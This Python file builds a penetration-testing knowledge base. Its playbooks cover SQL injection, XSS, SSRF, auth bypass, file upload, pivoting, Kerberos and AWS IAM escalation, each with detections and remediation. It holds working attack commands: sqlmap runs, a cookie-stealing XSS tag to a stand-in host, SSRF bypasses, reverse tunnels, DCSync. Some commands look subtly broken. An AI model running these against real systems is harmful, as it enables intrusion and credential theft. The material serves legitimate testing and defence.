"""Curated content for 01-intel, 02-payloads, 03-wordlists, 04-evasion."""

from __future__ import annotations

FILES: dict[str, str] = {}

# ===========================================================================
# 01-intel
# ===========================================================================

FILES["01-intel/playbooks/web/sql-injection.md"] = r'''
# Playbook - SQL Injection

| Field | Value |
|---|---|
| `playbook_id` | PB-WEB-SQLI |
| `cwe_id` | CWE-89 |
| `owasp_top10` | A03:2021 - Injection |
| `owasp_controls` | INPUT-2, INPUT-4, AUTHZ-4 |
| `payload_corpus` | `02-payloads/web/sqli/` |
| `automation` | `05-engines/sqlmap/` |
| `wordlist` | `03-wordlists/web/fuzzing/injection-words.txt` |
| `detections` | `06-defense/wazuh/rules/1005-web-app.rules`, `06-defense/suricata/rules/ssa-web-attacks.rules` |

## 1. Preconditions

* Written authorisation, scope identifier, and a test window.
* A staging mirror is preferred: production database writes are out of scope
  unless explicitly listed.

## 2. Discovery

```bash
# Manual: probe every parameter boundary with a single-quote and a boolean pair
curl -s "https://TARGET/search?q='"                      -o /dev/null -w '%{http_code}\n'
curl -s "https://TARGET/search?q=a%27%20AND%20%271%27=%271" -o /dev/null -w '%{http_code}\n'

# Automated fingerprinting
python tools/ssactl.py index --root .
sqlmap -u "https://TARGET/search?q=*" --batch --level=3 --risk=2 \
       --tamper=space2comment,between --dbms= --level=5 --technique=BEUSTQ
```

## 3. Decision tree

```
q'  ->  500 / WAF block / time delta        ->  likely injectable, escalate
q'' ->  same as q'                           ->  numeric or non-string context
q' AND '1'='1   ==  q' AND '1'='2'          ->  boolean-based confirmed
q' AND SLEEP(5)-- -   ->  time delta >= 5s   ->  time-based confirmed
q' UNION SELECT NULL-- -                    ->  error / column count probe
```

## 4. Exploitation order (least to most invasive)

| Order | Technique | Payload family | Risk |
|---|---|---|---|
| 1 | Boolean differential | `PL-WEB-SQLI-0001..0010` | none |
| 2 | UNION column mapping | `PL-WEB-SQLI-0020..0040` | none |
| 3 | Error-based extraction | `PL-WEB-SQLI-0050..0070` | low |
| 4 | Time-based blind | `PL-WEB-SQLI-0080..0095` | low (2-3 % CPU) |
| 5 | Out-of-band exfil | `PL-WEB-SQLI-0100..0110` | medium (DNS egress) |

Stop at the minimum proof required by the rules of engagement. Demonstrating
`current_user()` is enough; dumping `users` is usually not.

## 5. Bypass notes (see `02-payloads/web/sqli/README.md`)

| Obstacle | Bypass | sqlmap tamper |
|---|---|---|
| Space filtered | `/**/`, `%09` | `space2comment` |
| `OR` filtered | `||`, `OR/**/1` | `randomcase` |
| Single quote stripped | CHAR()/CONCAT() | `chardoubleencode` |
| WAF SQLi keyword | inline comments | `space2hash`, `randomcomments` |
| Stacked queries disabled | UNION / subquery only | - |

## 6. Detection expectations

| Layer | Expected signal |
|---|---|
| Network | Suricata `ssa-web-attacks.rules` sid `3001001+`, `http.uri` containing boolean tautology |
| Host | Wazuh rule `86610` (web log) with `sqlmap` / `UNION SELECT` / `SLEEP(` in query string |
| WAF | Managed rule hits, source IP correlation over 60 s |
| Database | Sudden spike in parse errors, `xp_cmdshell`, `INTO OUTFILE` |

## 7. Remediation

1. Parameterised queries / prepared statements - the only complete fix (OWASP
   INPUT-2).
2. Least-privilege database accounts; the application never holds DDL rights.
3. Input validation with an allow-list for identifiers (OWASP INPUT-4).
4. Suppress verbose DB errors in responses (OWASP ERR-1).
5. Detection: alert on tautology patterns even after remediation - attackers
   still probe, and probing is a leading indicator.
'''.lstrip()

FILES["01-intel/playbooks/web/xss.md"] = r'''
# Playbook - Cross-Site Scripting

| Field | Value |
|---|---|
| `playbook_id` | PB-WEB-XSS |
| `cwe_id` | CWE-79 |
| `owasp_top10` | A03:2021 |
| `owasp_controls` | DOM-1, DOM-2, DOM-3, INPUT-7 |
| `payload_corpus` | `02-payloads/web/xss/` |
| `detections` | `06-defense/sigma/ssa_web_xss_probe.yml`, CSP report ingestion |

## 1. Reflection analysis

```
value reflected in HTML body      -> text context   -> <,>,",'
value reflected in attribute      -> attribute ctx  -> ", ', <space
value reflected in <script>       -> script ctx     -> </script><
value reflected in JS string     -> js string      -> ', \, newline
value reflected in URL            -> url ctx        -> javascript:, data:
value reflected in DOM via JS     -> DOM ctx        -> innerHTML sink
value reflected in fetch() header -> header ctx     -> CRLF
```

## 2. Context matrix (see `02-payloads/web/xss/payloads.json`)

| Context | Minimal probe | Encoding notes |
|---|---|---|
| HTML text | `<b>x</b>` | entity-encode `<` `>` |
| Attribute (double) | `" onmouseover=alert(1) x="` | entity-encode `"` |
| Attribute (single) | `' onmouseover=alert(1) x='` | entity-encode `'` |
| Script block | `</script><img src=x onerror=alert(1)>` | do not entity-encode |
| JS string | `'-alert(1)-'` | `\u0027` |
| URL | `javascript:alert(1)` | encode `:` |
| Template | `{{7*7}}` then `${7*7}` | SSTI, see `ssti/` |

## 3. Cookie / session impact ladder

1. **Reflected** - victim must be lured; no persistence.
2. **Stored** - persists for every reader, including admins; highest impact.
3. **DOM** - client-side only; bypasses server WAF entirely; found by source review.
4. **Mutation XSS** - payload survives sanitiser but re-parses dangerously.

## 4. Non-invasive proof

Preferred in production: use an out-of-band domain you control and a callback
image, or `document.title` exfiltration. Never use `alert()` on a client
system you do not own.

```html
<img src="https://COLLAB/x?c="+document.cookie>
```

## 5. Remediation

1. Context-aware output encoding (OWASP DOM-1/2/3) - encode at the sink.
2. Sanitise with an allow-list HTML sanitiser for rich content.
3. CSP with nonces, no `unsafe-inline` (OWASP DOM-4).
4. `HttpOnly` + `Secure` + `SameSite` cookies (OWASP SESSION-4).
5. Mark sessions `HttpOnly` so a stolen DOM token cannot be replayed directly.
'''.lstrip()

FILES["01-intel/playbooks/web/ssrf.md"] = r'''
# Playbook - Server-Side Request Forgery

| Field | Value |
|---|---|
| `playbook_id` | PB-WEB-SSRF |
| `cwe_id` | CWE-918 |
| `owasp_controls` | INPUT-8, DES-1 |
| `payload_corpus` | `02-payloads/web/ssrf/` |
| `detections` | `06-defense/suricata/rules/ssa-ssrf-metadata.rules` |

## 1. Cloud metadata targets

| Cloud | Endpoint | IMDSv2 required |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` | Yes (IMDSv2 token) |
| AWS IMDSv2 token | `http://169.254.169.254/latest/api/token` | `PUT`, header `X-aws-ec2-metadata-token-ttl-seconds` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Header `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Header `Metadata: true` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | - |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | - |

## 2. Bypass ladder

```
http://127.0.0.1/                 -> baseline
http://0/                         -> 0.0.0.0 alias
http://[::1]/                     -> IPv6 loopback
http://2130706433/                -> decimal loopback
http://0x7f.0.0.1/                -> hex loopback
http://0177.0.0.1/                -> octal loopback
http://127.1/                     -> short form
http://localtest.me/              -> resolves to 127.0.0.1 (DNS rebinding friendly)
http://169.254.169.254.nip.io/    -> metadata via hostname
gopher://127.0.0.1:6379/_*...     -> Redis, protocol smuggling
file:///etc/passwd                -> local file read
dict://127.0.0.1:11211/stats      -> memcached
```

## 3. Impact chain

`SSRF -> internal service -> RCE` is the highest-yield chain:
Redis `CONFIG SET dir` + `dbfilename` writes a cron/authorized_keys file;
Docker socket `/var/run/docker.sock` creates a privileged container.

## 4. Detection

* Wazuh rule `86620`: outbound HTTP to link-local metadata from a non-cloud role.
* Suricata `ssa-ssrf-metadata.rules`: `http.host` == `169.254.169.254` or
  `metadata.google.internal`, alert + log payload.
* CloudTrail / GCP audit: `GetInstanceMetadata` calls with unexpected `User-Agent`.

## 5. Remediation

1. Allow-list destinations; resolve DNS and validate the *resolved IP*.
2. Block link-local, loopback and RFC1918 at the egress proxy (OWASP DES-1).
3. Disable IMDSv1; require IMDSv2 with hop limit 1 (AWS) / required headers.
4. Network segmentation between application tier and metadata service.
5. Egress traffic shaping: application servers should not speak to the internet
   at all except through a proxy.
'''.lstrip()

FILES["01-intel/playbooks/web/authentication-bypass.md"] = r'''
# Playbook - Authentication & Session Bypass

| Field | Value |
|---|---|
| `playbook_id` | PB-WEB-AUTHBYPASS |
| `cwe_id` | CWE-287, CWE-303 |
| `owasp_top10` | A07:2021 |
| `owasp_controls` | AUTH-1, AUTH-2, AUTH-3, AUTH-4, AUTH-7, SESSION-1..5 |
| `payload_corpus` | `02-payloads/api/`, `02-payloads/web/sqli/` |
| `detections` | `06-defense/wazuh/rules/1005-web-app.rules` (4625, 4728, 4729) |

## 1. Password attack ladder

| Step | Action | Wordlist |
|---|---|---|
| 1 | Credential stuffing from breach corpora | `03-wordlists/credentials/userpass-combinations.txt` |
| 2 | Password spraying (1-3 passwords / user, low rate) | `03-wordlists/credentials/common-passwords.txt` |
| 3 | Targeted list per persona (CTO, dev, HR) | `03-wordlists/web/fuzzing/usernames.txt` |
| 4 | Default credentials on exposed appliances | `03-wordlists/credentials/defaults.txt` |
| 5 | Kerberos AS-REP roasting (no spray at all) | - |

Rate limit: stay under the client's lockout policy; prefer spraying (many users,
few attempts) over brute force (one user, many attempts).

## 2. Authentication logic flaws

```bash
# Parameter pollution: does the app trust the first or the last value?
curl -s "https://TARGET/login?username=admin&username=attacker"

# Case / unicode normalisation: admin, Admin, ADMIN, admın
# JSON type juggling
curl -s -X POST "https://TARGET/api/login" -d '{"user":"admin","pass":true}'
curl -s -X POST "https://TARGET/api/login" -d '{"user":"admin","pass":0}'

# Mass assignment on registration
curl -s -X POST "https://TARGET/api/register" -d '{"user":"a","role":"admin","isAdmin":true}'

# Password reset token handling
curl -s "https://TARGET/reset?token=<jwt>"        # no expiry / no user binding
curl -s -X POST "https://TARGET/reset" -d '{"email":"victim@x"}'  # user enumeration
```

## 3. JWT attack checklist

| Check | Payload / technique | Reference |
|---|---|---|
| `alg: none` | strip signature | `02-payloads/api/jwt-none.jwt` |
| Algorithm confusion | RS256 public key used as HMAC secret | `02-payloads/api/jwt-hs256-confusion.md` |
| Weak secret | `secret`, `password`, `key` | `03-wordlists/credentials/jwt-secrets.txt` |
| Missing claims | no `exp`, no `aud`, no `iss` | - |
| Key confusion | `kid` header → local file / URL injection | `02-payloads/api/jwt-kid-injection.md` |
| Token reuse | reuse across users/environments | - |

## 4. Session management

* Predictable session id (low entropy, timestamp-derived).
* Session id in URL, or leaking via `Referer`.
* No rotation after privilege change (OWASP SESSION-3).
* `Secure` missing on an HTTPS-only application.
* Long-lived sessions with no absolute timeout (OWASP SESSION-3).

## 5. Detection

| Signal | Source | Rule |
|---|---|---|
| 4625 burst across many users | Windows log | Wazuh 86630 (spray) |
| 4625 followed by 4624 same user | Windows log | Wazuh 86631 (success after failures) |
| Logon outside business hours / geolocation | Windows log | Wazuh 86632 |
| 4728 new member in privileged group | Windows log | Wazuh 86640 |
| Password reset requests for many accounts | App log | Wazuh 86650 |

## 6. Remediation

Prioritise OWASP AUTH-1..7 and SESSION-1..5: MFA on privileged paths, generic
error messages, rate limiting with progressive backoff, server-side session
store, rotate on auth, absolute + idle timeout, and `Secure; HttpOnly; SameSite`.
'''.lstrip()

FILES["01-intel/playbooks/web/file-upload.md"] = r'''
# Playbook - Unrestricted File Upload

| Field | Value |
|---|---|
| `playbook_id` | PB-WEB-UPLOAD |
| `cwe_id` | CWE-434 |
| `owasp_controls` | INPUT-1, INPUT-5, DES-5 |
| `payload_corpus` | `02-payloads/web/` (`web-upload.md` entries) |
| `tooling` | `07-tooling/cyberchef/` for magic-byte normalisation |

## 1. Bypass ladder

```
report.php.jpg.php        -> double extension, Apache multi-extension risk
report.php%00.jpg         -> null byte (legacy engines)
report.pHp                -> case-insensitive handler match
report.php.               -> trailing dot (Windows)
report.php::$DATA         -> NTFS alternate data stream
report.pdf -> magic bytes -> upload .png with %PDF- header
polyglot .jpg + .php       -> EXIF injection, GIF89a polyglots
.zip with .php entry       -> if extraction is by name only
```

## 2. Content validation, done properly

```bash
# never trust the client MIME type - inspect the bytes
xxd -l 16 uploaded.bin
file --mime-type uploaded.bin
# compare declared type, client MIME, extension and actual magic bytes - all four
```

## 3. Execution vectors

| Vector | Condition |
|---|---|
| Direct execution | Uploaded file served by the app server in an executable location |
| PHP include | File lands where an include/require can reach it |
| Template | `.ftl`, `.tpl`, `.jsp`, `.shtml` extension execution |
| Image parser | ImageMagick `convert`, `identify`, PHP `getimagesize()` |
| Archive extraction | Zip-slip (`../`), symlink entries, tar traversal |

## 4. Remediation

1. Store uploads outside the web root, serve from a separate origin (OWASP DES-5).
2. Allow-list extensions and derive the stored name server-side; never trust
   the client filename (OWASP INPUT-5).
3. Validate content by magic bytes, re-encode images (re-serialize, do not just
   check the header).
4. Disable execution in the upload directory (`engine off`, no handler).
5. Size limits, per-user quotas, and quarantine scanning.

## 5. Detection

* Wazuh rule `86670`: web server writes a new file with an executable extension
  into a served path.
* Wazuh rule `86671`: `ImageMagick`/`ffmpeg` spawned by a web server process.
* Suricata `ssa-web-attacks.rules` sid `3001015`: upload with a double extension.
'''.lstrip()

FILES["01-intel/playbooks/network/service-enumeration.md"] = r'''
# Playbook - Network Service Enumeration

| Field | Value |
|---|---|
| `playbook_id` | PB-NET-ENUM |
| `phase` | Reconnaissance / Scanning (PTES) |
| `wordlists` | `03-wordlists/network/ports.txt`, `03-wordlists/network/banners.txt` |
| `automation` | `05-engines/` (Metasploit auxiliary scanners) |

## 1. Order of operations

```bash
# 0. Passive first - no packets to the target
whois TARGET                     # registrar, netscope
amass enum -passive -d TARGET    # CT logs, passive DNS
shodan host TARGET               # historical banner index

# 1. Host discovery
nmap -sn -PR TARGET-CIDR         # ARP sweep on-segment
nmap -sn -PU --min-rate 1000 CIDR

# 2. Port scan (choose by noise tolerance)
nmap -sS -T4 -p- --min-rate 1000 TARGET      # stealth SYN, full range
nmap -sV -sC -p 22,80,443,445,3389 TARGET    # version + default scripts

# 3. UDP (slow, rate limited)
nmap -sU --top-ports 50 --max-retries 1 TARGET

# 4. Service -> template pipeline
nmap -sV -oN sweep.txt TARGET
cut -d' ' -f3 sweep.txt | sort -u | while read p; do \
  echo "== port $p"; searchsploit "$p"; done
```

## 2. Triage matrix

| Service | Version | Immediate questions | Playbook |
|---|---|---|---|
| SSH 22 | old (<= 8.2p1) | weak kex? password auth? | `playbooks/network/pivoting.md` |
| SMB 445 | Windows | signing enabled? shares? | `playbooks/active-directory/smb-relay.md` |
| RDP 3389 | any | NLA? creds reuse? | `playbooks/network/pivoting.md` |
| WinRM 5985 | any | auth required? | `playbooks/active-directory/` |
| MySQL 3306 | any | anonymous login? | `playbooks/web/sql-injection.md` |
| Redis 6379 | any | no AUTH? | `playbooks/network/pivoting.md` (RCE chain) |
| HTTP 80/443 | any | framework? headers? | `playbooks/web/` |
| Docker API 2375 | any | unauthenticated? | `04-evasion/containers/` |
| Kubernetes 6443 | any | anonymous auth? | `04-evasion/containers/` |

## 3. Low-and-slow alternatives

| Need | Noisy tool | Quiet tool |
|---|---|---|
| Port scan | nmap default | `nmap -T2 --max-retries 2 --scan-delay 500ms` |
| Web content | gobuster (parallel 50) | `gobuster -t 4 -r 1s` |
| DNS brute | fierce default | `fierce -dns -s 8.8.8.8 -t 40 -delay 10` |
| Password spray | hydra parallel | `hydra -P -t 4 -W 3 -f` |

## 4. Detection of the scan itself

* Suricata `ssa-scanning.rules`: SYN to >20 distinct ports in 60 s from one source.
* Wazuh rule `86700`: repeated connection attempts across services.
* Expect to be detected; for covert engagements agree a source IP or
  "scan window" in the rules of engagement.
'''.lstrip()

FILES["01-intel/playbooks/network/pivoting.md"] = r'''
# Playbook - Pivoting, Relaying and Tunnelling

| Field | Value |
|---|---|
| `playbook_id` | PB-NET-PIVOT |
| `attack_ids` | T1090 (Proxy), T1572 (Protocol Tunneling) |
| `engines` | `05-engines/metasploit/modules/auxiliary/gateway-tunnel.md` |
| `detections` | Suricata `ssa-tunneling.rules`, Wazuh `86710` |

## 1. Scenario catalogue

| Situation | Technique | Tooling |
|---|---|---|
| Only SSH exposed | SSH local/remote port forwarding | `ssh -L`, `ssh -J` |
| SMB only | SOCKS over SMB | `pivoting` via Impacket, chisel over SMB |
| WinRM only | WinRM port forward | Evil-WinRM, `winrs` |
| HTTP only | CONNECT / reverse tunnel | `chisel`, `ligolo-ng` |
| No inbound | Reverse shell + pivot | `metasploit` pivot, `chisel` client |
| SMB signing enforced | Named pipe / DCOM | Impacket `psexec`, `atexec` |

## 2. Chisel (HTTP tunnel over a single port)

```bash
# Attacker (server)
./chisel server --reverse --port 8080

# Through the compromised jump host
./chisel CLIENT:1080 R:1080:127.0.0.1:8080
```

## 3. Ligolo-ng (transparent layer-3 tunnel)

```bash
# Attacker
./ligologo proxy -selfcert -Laddr 0.0.0.0:443
# Agent on target
./ligologo agent -proxy SOCKS5://ATTACKER:443 -ignore-cert
```

## 4. SOCKS + proxychains

```bash
# Pivot host
socat TCP-LISTEN:1080,fork,reuseaddr SOCKS:127.0.0.1:1080
# Client
./chisel CLIENT:9050 R:socks ->127.0.0.1:1080
proxychains nmap -sT -p 80,443,445 -iL /dev/stdin <<< "10.10.10.0/24"
```

## 5. Detection

| Tunnel | Signal |
|---|---|
| SSH port forward | Long-lived SSH with no interactive TTY, high entropy channel data |
| HTTP CONNECT | Suricata `http.method=CONNECT`, destination port not 443 |
| Reverse HTTP tunnel | Regular beaconing to a single URI, constant interval, no session affinity |
| SOCKS proxy | Application (curl/nmap) connecting to non-standard local port |

## 6. Hardening

* Egress filtering: deny outbound 443 except to approved destinations.
* No inbound management ports on the internet; bastion + VPN.
* `AllowTcpForwarding no` for unprivileged accounts.
'''.lstrip()

FILES["01-intel/playbooks/active-directory/kerberos-attacks.md"] = r'''
# Playbook - Active Directory / Kerberos Attacks

| Field | Value |
|---|---|
| `playbook_id` | PB-AD-KERBEROS |
| `attack_ids` | T1558.003, T1550.003, T1558.004 |
| `engines` | `05-engines/metasploit/post-exploitation/privesc-map.md` |
| `evasion` | `04-evasion/windows/` |
| `detections` | `06-defense/wazuh/rules/1010-ad.rules`, `06-defense/sigma/ssa_ad_*` |

## 1. Attack map

```
  Password spray            -> T1110.003
  AS-REP roasting           -> T1558.004   (accounts without "do not require Kerberos preauth")
  Kerberoasting            -> T1558.003   (service ticket hash extraction)
  DCSync                   -> T1003.006   (mimikatz lsadump::dcsync)
  SMB relay                -> T1187       (signing + egress filtering are the controls)
  ADCS abuse (ESC1)        -> T1649       (http://ADCS/<CASP>-based URL)
  Constrained delegation    -> T1134.005
  Shadow credentials        -> T1556.003
```

## 2. Pre-flight discovery

```powershell
# who can write a dSACL / who owns the domain object
Get-ADObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties * |
  Select-Object DistinguishedName, msDS-AllowedToDelegateTo

# accounts vulnerable to AS-REP roast (no preauth required)
Get-ADUser -LDAPFilter '(!userPassword:1.2.840.113556.1.4.803:=2)(userAccountControl:1.2.840.113556.1.4.803:=512)'

# trusts
Get-ADTrust -Filter * | Select Name, Direction, Type
```

## 3. Kerberoast / AS-REP roast workflow

```bash
# Enumerate SPNs
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName
# Crack tickets
hashcat -m 13100 kerberoast.hashes /opt/wordlists/03-wordlists/credentials/rockyou-top10000.txt
john --wordlist=/opt/wordlists/03-wordlists/credentials/rockyou-top10000.txt kerberoast.hashes

# AS-REP roast
Get-DomainUser -ASREPReadable | Select SamAccountName
impacket-GetNPUsers 'domain.local/':' -request
```

## 4. DCSync prerequisites and detection

```bash
# Attack
secretsdump.py 'domain.local/user:pass@dc01' -just-dc-user -just-dc-group -just-dc-pwd

# Detection - 4662 with replication GUIDs on a non-DC host = loud
#   GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2  GetNCChanges
#   GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2  GetDeltas
#   GUID 89e95b76-444d-4c62-991a-0facbeda640c  GetChanges
#   GUID 89e95b77-444d-4c62-991a-0facbeda640c  GetAllChanges
```

**Rule of thumb: 4662 with any of these GUIDs on a host that is not a DC is an
incident, not a curiosity.**

## 5. Detection matrix

| Attack | Windows event | Sigma | Wazuh |
|---|---|---|---|
| AS-REP roast (bulk) | 4768 (0x17, no preauth) | `ssa_ad_asrep_roast.yml` | 86750 |
| Kerberoast (bulk) | 4769 RC4-HMAC count spike | `ssa_ad_kerberoast.yml` | 86751 |
| DCSync | 4662 + replication GUID, non-DC | `ssa_ad_dcsync.yml` | 86752 |
| SMB relay | 4624 type 3 immediately after 5140/5145 | `ssa_ad_smb_relay.yml` | 86753 |
| Shadow creds | 4672 + msDS-credential-linked object | `ssa_ad_shadow_credentials.yml` | 86754 |
| ADCS abuse | outbound http to `http://<CASP>` | `ssa_ad_adcs_abuse.yml` | 86755 |

## 6. Hardening (mapping to `06-defense/hardening/windows-baseline.md`)

1. Disable RC4 / DES crypto (`msDS-SupportedEncryptionTypes` AES only) - kills
   most roasting.
2. `msDS-NoKerberosPreAuthentication = false` for service accounts.
3. Protected Users / authentication policy - restrict NTLM.
4. SMB signing mandatory + egress block on 445.
5. Tiered administration; no domain admin on workstations.
6. Monitor 4662 replication GUIDs at the collector, not at the DC.
'''.lstrip()

FILES["01-intel/playbooks/cloud/aws-iam-privesc.md"] = r'''
# Playbook - AWS IAM Privilege Escalation

| Field | Value |
|---|---|
| `playbook_id` | PB-CLOUD-AWS-IAM |
| `attack_ids` | T1548, T1078.004, T1552.005 |
| `controls` | OWASP AUTHZ-2, NIST AC-6 |
| `detections` | `06-defense/blue-team/controls/controls.csv` (CLOUD-01..) |

## 1. Escalation primitives

| Primitive | Required permission | Impact |
|---|---|---|
| `iam:CreatePolicyVersion` on a managed policy you can attach | `iam:CreatePolicyVersion`, `iam:AttachUserPolicy` | Full account takeover |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Lambda | Code execution in a privileged role |
| `lambda:UpdateFunctionCode` on any function you can see | Lambda | In-place hijack |
| `sts:AssumeRole` with `trust` to your principal | STS | Cross-account |
| `iam:CreateAccessKey` for any user | IAM | Persistent access |
| `ec2:RunInstances` with an over-privileged instance profile | EC2 | Host the next stage in your account |
| `cloudformation:CreateStack` | CFN | Arbitrary service calls with any role you can pass |

## 2. Enumeration

```bash
# What can I do?
aws sts get-caller-identity
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCT:user/me \
    --action-names iam:CreatePolicyVersion lambda:UpdateFunctionCode

# Who can I become?
aws iam list-roles --query 'Roles[].[RoleName, Arn]' --output table
# Read trust policies and look for external accounts, service principals, wildcards
```

## 3. Least-privilege remediation checklist

1. Deny `iam:*` on `*` except the self-service paths you need (OWASP AUTHZ-2).
2. Scope conditions: `aws:RequestedRegion`, `aws:SourceVpce`, `aws:TagKeys`.
3. Split roles per function; never reuse a "power" role across workloads.
4. Require `aws:MultiFactorAuthPresent` in the principal condition block.
5. Invalidate and rotate any credential found in a wordlist scan
   (`03-wordlists/credentials/aws-keys.txt`).

## 4. Detection

* CloudTrail `CreatePolicyVersion`, `AttachUserPolicy`, `UpdateFunctionCode`
  without a matching change ticket.
* GuardDuty findings: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`,
  `Stealth:IAMUser/CloudTrailLoggingDisabled`.
* Anomalous `AssumeRole` chain depth > 2 in a session.
'''.lstrip()

FILES["01-intel/methodologies/osstmm.md"] = r'''
# OSSTMM - Operational Security Testing Methodology Mapping

| Field | Value |
|---|---|
| `methodology_id` | MTH-OSSTMM |
| `version` | 3.x |
| `url` | http://www.osstmm.org/ |

## 1. Phase mapping into the archive

| OSSTMM phase | Activity | Archive location | Output |
|---|---|---|---|
| 1 Network Rules | Map rules, ports, trust boundaries | `01-intel/playbooks/network/service-enumeration.md` | Rule map |
| 2 Network Map | Discover hosts and services | `03-wordlists/network/` | Asset inventory |
| 3 Network Service Identification | Fingerprint daemons | `03-wordlists/network/banners.txt` | Service matrix |
| 4 Service Enumeration | Enumerate each service | `01-intel/playbooks/network/` | Per-service notes |
| 5 Service Component Identification | Components and versions | `02-payloads/` | Version matrix |
| 6 Service Attack | Test vulnerabilities | `02-payloads/`, `05-engines/` | Findings |
| 7 Post Attack | Lateral movement, privesc | `04-evasion/`, `01-intel/playbooks/active-directory/` | Access paths |
| 8 Organisation | Social / process | `01-intel/cheat-sheets/book-of-secret-knowledge.md` | Process findings |

## 2. RAV scoring

`RAV = (Vulnerability severity x Exploitability) + (Detection difficulty x Impact)`

Report ordering is by RAV, not by scanner severity. Store the score in the
finding record so `13-training/assessments` can grade consistency.

## 3. Evidence requirement

Every test in every phase must leave evidence: command line, timestamp,
request/response pair. `06-defense/ir/` and `05-engines/` both expect this
format; see `14-docs/standards/knowledge-format.md` §4.
'''.lstrip()

FILES["01-intel/methodologies/ptes.md"] = r'''
# PTES - Penetration Testing Execution Standard Mapping

| Field | Value |
|---|---|
| `methodology_id` | MTH-PTES |
| `url` | http://www.pentest-standard.org/ |

## 1. Standard mapping

| PTES section | Archive location | Notes |
|---|---|---|
| 1 Intelligence Gathering | `05-engines/osint/sherlock/`, `08-threatintel/` | Passive first |
| 2 Threat Modelling | `00-governance/threat-model.md`, `01-intel/playbooks/` | Our own threat model is the reference example |
| 3 Vulnerability Identification | `03-wordlists/`, `05-engines/metasploit/modules/` | Continuous, not one-shot |
| 4 Exploitation | `02-payloads/`, `05-engines/sqlmap/` | Least-invasive-first ladder |
| 5 Post Exploitation | `04-evasion/`, `01-intel/playbooks/active-directory/` | Document the access path |
| 6 Reporting | `14-docs/standards/knowledge-format.md` §4 | RAV + remediation + evidence |

## 2. Engagement phases

```
  PLAN ----> RECON ----> SCAN ----> ENUM ----> EXPLOIT ----> PRIVESC ----> REPORT
   |            |          |          |            |            |            |
   v            v          v          v            v            v            v
 charter    sherlock   wordlists  service-    payloads/    04-evasion   14-docs/
 00-gov     08-threat  03-        enumeration sqlmap      active-dir   standards
            intel      wordlists  playbook               kerberos
```

## 3. Rules of engagement minimums

* Scope: CIDRs, domains, wildcards, explicitly excluded assets.
* Time window and timezone; out-of-band contacts.
* Source IP(s) and whether they will be detected on purpose.
* Emergency contact; stop conditions (data destruction, DoS, third-party data).
* Evidence handling and retention period (see
  `00-governance/data-classification.md`).
'''.lstrip()

FILES["01-intel/methodologies/nist-sp800-61.md"] = r'''
# NIST SP 800-61r2 - Computer Security Incident Handling Guide

| Field | Value |
|---|---|
| `methodology_id` | MTH-NIST-800-61 |
| `reference` | NIST SP 800-61 Rev. 2, Computer Security Incident Handling Guide |

## 1. Four-phase lifecycle mapped to `06-defense/ir/`

| NIST phase | Goal | Archive location | Artefacts |
|---|---|---|---|
| Preparation | Capability before the event | `06-defense/ir/incident-response-playbook.md`, `06-defense/sigma/` | Tabletop, contacts, tooling |
| Detection & Analysis | Establish what happened | `08-threatintel/`, `06-defense/ir/timeline.md` | Confirmed incident statement |
| Containment, Eradication, Recovery | Stop, remove, restore | `06-defense/ir/` containment matrix | Clean host evidence |
| Post-Incident Activity | Learn | `14-docs/decisions/`, `CHANGELOG.md` | Lessons learned |

## 2. Incident severity matrix (from the archive's IR playbook)

| Sev | Definition | Response target | Escalation |
|---|---|---|---|
| SEV1 | Confirmed data exfiltration or ransomware encryption | 15 min | CISO + Legal |
| SEV2 | Confirmed compromise, scope unknown | 30 min | SOC lead |
| SEV3 | Suspicious activity, unconfirmed | 4 h | Analyst |
| SEV4 | Policy violation without impact | 1 day | Team lead |

## 3. Evidence handling

Chain of custody: `06-defense/ir/evidence-handling.md`, hashes recorded with
`Get-FileHash -Algorithm SHA256` (PowerShell) and verified before and after
transfer. Never analyse the original; always work on a copy.

## 4. Detection sources mapped to the archive

| Source | Archive artefact |
|---|---|
| Suricata network alerts | `06-defense/suricata/rules/` |
| Wazuh host rules | `06-defense/wazuh/rules/` |
| Sigma portability layer | `06-defense/sigma/` |
| IOC feed ingestion | `08-threatintel/feeds/feed-registry.yaml` |
| CTI context | `08-threatintel/actors/` |
'''.lstrip()

FILES["01-intel/methodologies/mitre-attack.md"] = r'''
# MITRE ATT&CK Coverage Model

| Field | Value |
|---|---|
| `methodology_id` | MTH-MITRE-ATTACK |
| `version` | ATT&CK v16 (matrix pinned in the lock file) |
| `url` | https://attack.mitre.org/ |

## 1. How the archive expresses coverage

Every offensive artifact in the archive declares one or more ATT&CK technique
IDs, and every defensive artifact declares the technique it detects. The
coverage matrix is generated:

```
  02-payloads/**      -- tags: [attack.t1190]
  04-evasion/**       -- tags: [attack.t1218]
  05-engines/**       -- tags: [attack.t1059.001]
  06-defense/**       -- tags: [attack.t1218]   (detection side)
                    \                        /
                     `-> 10-crosswalk/attack-coverage/attack-coverage.csv`
```

## 2. Coverage states

| State | Meaning | Gate behaviour |
|---|---|---|
| `full` | payload + evasion + module + detection | - |
| `offensive-only` | technique known, no detection | warns on `--strict` |
| `detective-only` | detection exists, no documented offence | informational |
| `gap` | neither | listed in the monthly gap report |

## 3. Tactic view (abridged, generated from the matrix)

| Tactic | Techniques in archive | Detection coverage |
|---|---|---|
| Initial Access | T1190, T1566, T1078 | high |
| Execution | T1059.001-.006, T1204 | high |
| Persistence | T1098, T1505.003, T1547 | medium |
| Privilege Escalation | T1068, T1134, T1548 | medium |
| Defense Evasion | T1218, T1027, T1112 | high |
| Credential Access | T1003, T1110, T1558 | high |
| Discovery | T1087, T1018, T1482 | high |
| Lateral Movement | T1021, T1570, T1090 | medium |
| Collection | T1005, T1560 | low |
| Exfiltration | T1041, T1567 | medium |
| Command and Control | T1071, T1573 | medium |
| Impact | T1486, T1490 | medium |

## 4. Purple-team exercise loop

1. Pick a gap from the coverage CSV.
2. Build an emulation in `09-labs/emulations/`.
3. Run it, observe which rules fire, note the gaps in the emulation file.
